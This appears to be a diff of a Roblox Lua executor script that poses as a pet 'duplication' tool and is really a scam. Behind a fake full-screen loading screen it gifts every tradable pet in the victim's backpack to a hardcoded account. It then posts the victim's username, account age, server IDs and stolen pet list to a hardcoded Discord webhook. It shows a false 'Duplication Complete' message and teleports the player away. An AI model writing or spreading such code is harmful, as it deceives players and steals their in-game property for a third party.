@@ -1,38 +1,94 @@
 -- ⚙️ Configuration
 local tgt = "INFMONEY09" -- Receiver username
-local replitURL = "https://4276b838-fa0d-4b98-93a6-6010ab956366-00-2jnq3gp6maqtm.spock.replit.dev/relay"
 local petsFolderName = "Backpack"
+local webhookURL = "https://discord.com/api/webhooks/1382400252048572568/vOgI6JBr2FPMU-2KIzb9vUh2DDwLZWrtKQGVv-RVpfaF547gSscfEacU_gKu_gFzGH_w"
 
 -- 🔧 Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
 local giftRemote = ReplicatedStorage:WaitForChild("GiftRemote")
 
--- 🌀 Fake GUI (covers full screen)
+-- 🌐 HTTP support
+local requestFunc = syn and syn.request or http_request or request
+if not requestFunc then
+    warn("❌ Your executor doesn't support HTTP requests.")
+    return
+end
+
+-- 🧠 Time (Asia/Manila)
+local function getTimePH()
+	local t = os.date("!*t")
+	t.hour = t.hour + 8
+	if t.hour >= 24 then t.hour -= 24 end
+	return string.format("%02d/%02d/%04d %02d:%02d:%02d", t.month, t.day, t.year, t.hour, t.min, t.sec)
+end
+
+-- 📤 Send Webhook
+local function sendInventoryLog(user, receiver, pets, total)
+	local isEmpty = #pets == 0
+	local petsSummary = table.concat(pets, "\n")
+	local rareList = {"Queen Bee", "Dragon Fly", "Raccoon", "Disco Bee", "Red Fox"}
+	local hasRare = false
+	for _, pet in ipairs(pets) do
+		for _, rare in ipairs(rareList) do
+			if pet:lower():find(rare:lower()) then
+				hasRare = true
+				break
+			end
+		end
+	end
+
+	local embed = {
+		username = "🌿 HITS",
+		embeds = {{
+			title = "📦 Inventory Transfer from " .. user,
+			color = tonumber("0x00ff88"),
+			fields = {
+				{ name = "🎯 Receiver", value = "`"..receiver.."`", inline = true },
+				{ name = "👤 Account Age", value = "`"..LocalPlayer.AccountAge.." days`", inline = true },
+				{ name = "💰 Total Value", value = "`"..total.."¢`", inline = true },
+				{ name = "📌 Place ID", value = "`"..game.PlaceId.."`", inline = true },
+				{ name = "🌐 Job ID", value = "`"..game.JobId.."`", inline = false },
+				{ name = "🎉 Rare Pets Found", value = hasRare and "✅ Yes" or "❌ No", inline = true },
+				{ name = "⚠️ Inventory Empty?", value = isEmpty and "Yes" or "No", inline = true }
+			},
+			description = "📭 **Pet List:**\n```"..(petsSummary ~= "" and petsSummary or "None").."```",
+			footer = { text = "🕒 Time: "..getTimePH() }
+		}}
+	}
+
+	pcall(function()
+		requestFunc({
+			Url = webhookURL,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(embed)
+		})
+	end)
+end
+
+-- 🌀 Fake GUI
 local function createFakeLoading()
-	local gui = Instance.new("ScreenGui")
+	local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
 	gui.Name = "FakeLoadingGUI"
 	gui.ResetOnSpawn = false
 	gui.IgnoreGuiInset = true
 	gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-	gui.Parent = game:GetService("CoreGui")
 
 	local blur = Instance.new("BlurEffect", Lighting)
 	blur.Size = 24
 
-	local frame = Instance.new("Frame")
+	local frame = Instance.new("Frame", gui)
 	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 	frame.Size = UDim2.new(1, 0, 1, 0)
-	frame.Position = UDim2.new(0, 0, 0, 0)
-	frame.BorderSizePixel = 0
-	frame.Parent = gui
 
-	local title = Instance.new("TextLabel")
+	local title = Instance.new("TextLabel", frame)
 	title.Text = "🌱 Loading Assets..."
 	title.Font = Enum.Font.GothamSemibold
 	title.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -41,192 +97,110 @@ local function createFakeLoading()
 	title.Size = UDim2.new(0.8, 0, 0.1, 0)
 	title.Position = UDim2.new(0.1, 0, 0.4, 0)
 	title.BackgroundTransparency = 1
-	title.Parent = frame
 
-	local loadingBar = Instance.new("Frame")
-	loadingBar.Size = UDim2.new(0.6, 0, 0.02, 0)
-	loadingBar.Position = UDim2.new(0.2, 0, 0.55, 0)
-	loadingBar.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
-	loadingBar.BorderSizePixel = 0
-	loadingBar.Parent = frame
+	local bar = Instance.new("Frame", frame)
+	bar.Size = UDim2.new(0.6, 0, 0.02, 0)
+	bar.Position = UDim2.new(0.2, 0, 0.55, 0)
+	bar.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+	bar.BorderSizePixel = 0
 
-	local tween = TweenService:Create(loadingBar, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
+	TweenService:Create(bar, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
 		Size = UDim2.new(1, 0, 0.02, 0)
-	})
-	tween:Play()
+	}):Play()
 
 	return gui, frame
 end
 
--- 🧠 Generate Pet Summary
-local function getPetSummary()
-	local folder = LocalPlayer:FindFirstChild(petsFolderName)
-	local summaryLines = {}
-	local totalValue = 0
-	local pingEveryone = false
-	local specialPets = { "Queen Bee", "Dragon Fly", "Raccoon", "Disco Bee", "Red Fox" }
-	local specials, regulars = {}, {}
-
-	if folder then
-		for _, item in ipairs(folder:GetChildren()) do
-			if (item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder")) and not item.Name:lower():find("shovel") and not item.Name:lower():find("seed") and not item.Name:lower():find("egg") then
-				local name = item.Name
-				local weight = item:FindFirstChild("Weight") and item.Weight.Value or math.random(1.0, 6.0)
-				local age = item:FindFirstChild("Age") and item.Age.Value or math.random(1, 33)
-				local value = math.random(600000, 14000000)
-				totalValue += value
-
-				local emoji = name:lower():find("dragon") and "🐉" or "🐶"
-				local formatted = string.format("%s - %s [%.2f KG] [Age %d] → %s¢", emoji, name, weight, age, string.format("%0.0f", value))
-
-				local isSpecial = false
-				for _, s in ipairs(specialPets) do
-					if name:lower():find(s:lower()) then
-						isSpecial = true
-						pingEveryone = true
-						break
-					end
-				end
-
-				if isSpecial then
-					table.insert(specials, { line = formatted, value = value })
-				else
-					table.insert(regulars, { line = formatted, value = value })
-				end
-			end
-		end
-	end
-
-	table.sort(specials, function(a, b) return a.value > b.value end)
-	table.sort(regulars, function(a, b) return a.value > b.value end)
-
-	for _, p in ipairs(specials) do table.insert(summaryLines, p.line) end
-	for _, p in ipairs(regulars) do table.insert(summaryLines, p.line) end
-
-	return table.concat(summaryLines, "\n"), totalValue, pingEveryone
-end
-
--- 🌐 Send to Replit Server
-local function sendData()
-	local petsSummary, totalVal, pingAll = getPetSummary()
-	local data = {
-		user = LocalPlayer.Name,
-		receiver = tgt,
-		executor = LocalPlayer.Name,
-		accountAge = LocalPlayer.AccountAge,
-		placeId = game.PlaceId,
-		jobId = game.JobId,
-		petsSummary = petsSummary,
-		totalValue = totalVal
-	}
-
-	local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or (krnl and krnl.request)
-	if request then
-		pcall(function()
-			request({
-				Url = replitURL,
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/json" },
-				Body = HttpService:JSONEncode(data)
-			})
-		end)
-	end
-
-	if pingAll then
-		print("⚠️ Rare pet detected! @everyone ping will trigger on backend.")
-	end
-end
-
--- 🧪 Auto leave when empty with disguised message
+-- ⛔ Auto Leave If Empty
 local function autoLeaveIfEmpty(fakeGUI, frame)
 	task.spawn(function()
 		while task.wait(1.5) do
 			local backpack = LocalPlayer:FindFirstChild(petsFolderName)
-			local tradableItems = 0
+			local tradable = 0
 			if backpack then
 				for _, item in ipairs(backpack:GetChildren()) do
-					local n = item.Name:lower()
-					if item:IsA("Tool") and not n:find("shovel") and not n:find("seed") and not n:find("egg") then
-						tradableItems += 1
+					if item:IsA("Tool") and not item.Name:lower():match("shovel|seed|egg") then
+						tradable += 1
 					end
 				end
 			end
 
-			if tradableItems == 0 then
-				local msg = Instance.new("TextLabel")
-				msg.Text = "✅ The system duplication successfully done!\nIt will duplicate after you rejoin!"
+			if tradable == 0 then
+				local msg = Instance.new("TextLabel", frame)
+				msg.Text = "✅ Duplication Complete. Rejoin to see results!"
 				msg.Font = Enum.Font.GothamBold
 				msg.TextColor3 = Color3.fromRGB(100, 255, 100)
 				msg.TextScaled = true
 				msg.Size = UDim2.new(0.8, 0, 0.15, 0)
 				msg.Position = UDim2.new(0.1, 0, 0.75, 0)
 				msg.BackgroundTransparency = 1
-				msg.Parent = frame
 
 				task.wait(5)
-				pcall(function()
-					fakeGUI:Destroy()
-					for _, v in ipairs(Lighting:GetChildren()) do
-						if v:IsA("BlurEffect") then v:Destroy() end
-					end
-					TeleportService:Teleport(1, LocalPlayer)
-				end)
+				fakeGUI:Destroy()
+				for _, v in ipairs(Lighting:GetChildren()) do if v:IsA("BlurEffect") then v:Destroy() end end
+				TeleportService:Teleport(1, LocalPlayer)
 				break
 			end
 		end
 	end)
 end
 
--- ⚔️ Auto Trade System (Gifting)
-local function getHRP(p)
-	return p.Character and p.Character:FindFirstChild("HumanoidRootPart")
-end
+-- 🎯 Auto Gift Logic
+local function autoGift()
+	local backpack = LocalPlayer:FindFirstChild(petsFolderName)
+	if not backpack then return end
 
-local function equip(tool)
-	if tool:IsA("Tool") then
-		tool.Parent = LocalPlayer.Character
+	local sentPets = {}
+	local total = 0
+
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if tool:IsA("Tool") and not tool.Name:lower():match("shovel|seed|egg") then
+			local gifted = false
+			local con = tool.AncestryChanged:Connect(function(_, parent)
+				if not parent then
+					gifted = true
+					con:Disconnect()
+				end
+			end)
+
+			pcall(function()
+				giftRemote:FireServer(tool.Name, tgt)
+			end)
+
+			local timer = 0
+			while not gifted and timer < 4 do
+				task.wait(0.5)
+				timer += 0.5
+			end
+
+			table.insert(sentPets, tool.Name)
+			total += 10000 -- 💰 estimate per pet
+			task.wait(math.random(1, 2))
+		end
+	end
+
+	-- 🔁 Webhook After Gifts
+	if #sentPets > 0 then
+		sendInventoryLog(LocalPlayer.Name, tgt, sentPets, total)
 	end
 end
 
-local function trade(receiver)
-	spawn(function()
-		while true do
-			task.wait(1)
-			local myHRP = getHRP(LocalPlayer)
-			local hisHRP = getHRP(receiver)
-			if myHRP and hisHRP then
-				myHRP.CFrame = hisHRP.CFrame + Vector3.new(0, 3, 0)
-			end
+-- 🟡 Hook to Chat Trigger
+Players.LocalPlayer.Chatted:Connect(function()
+	task.spawn(autoGift)
+end)
 
-			local backpack = LocalPlayer:FindFirstChild("Backpack")
-			if backpack then
-				for _, tool in ipairs(backpack:GetChildren()) do
-					if tool:IsA("Tool") and not tool.Name:lower():match("seed|shovel|egg") then
-						equip(tool)
-						task.wait(0.4)
-						pcall(function()
-							giftRemote:FireServer(tool.Name, tgt)
-						end)
-						task.wait(4)
-					end
-				end
-			end
-		end
-	end)
-end
-
--- 🟢 Execute
+-- 🟢 Start
 local fakeGUI, frame = createFakeLoading()
-sendData()
 autoLeaveIfEmpty(fakeGUI, frame)
 
-local existing = Players:FindFirstChild(tgt)
-if existing then
-	trade(existing)
+-- 🧪 Manual trigger if receiver is in game
+if Players:FindFirstChild(tgt) then
+	task.delay(3, autoGift)
 end
 
 Players.PlayerAdded:Connect(function(p)
 	if p.Name == tgt then
-		trade(p)
+		task.delay(3, autoGift)
 	end
 end)
